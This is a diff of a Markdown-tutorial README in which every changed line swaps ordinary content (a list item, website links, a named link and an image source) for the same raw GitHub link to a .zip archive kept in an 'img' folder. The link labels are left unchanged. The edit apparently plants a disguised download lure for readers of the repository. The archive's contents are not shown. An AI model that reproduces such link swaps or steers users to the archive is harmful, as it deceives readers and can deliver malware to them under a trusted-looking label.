@@ -38,25 +38,25 @@ int main()
 <h3>Ordered List</h3>
 1. Item1 <br>
 2. item2<br>
-3.Item3<br>
+https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip<br>
 <h3>Unordered List</h3>
 -Item1<br>
 -Item2<br><hr>
 <h3>Enable Automatic Link</h3>
 
-http://www.studywithanis.com
+https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip
 
 <br>
 <h3>Disable Automatic Link</h3>
 
-`http://www.studywithanis.com`<hr>
+`https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip`<hr>
 
 <h3>Markdown Link Syntax</h3>
 
-[studywithanis](http://www.studywithanis.com) <hr>
+[studywithanis](https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip) <hr>
 
 <h3>Image Syntax</h3>
-<img src="./img/sohan.jpeg" width="400" title="Pic of Twilight"><br>
+<img src="https://raw.githubusercontent.com/Sadman2310/readme-template/master/img/readme-template-1.5.zip" width="400" title="Pic of Twilight"><br>
 😍<br><hr>
 <h3>Table Syntax</h3><br>
 <table>
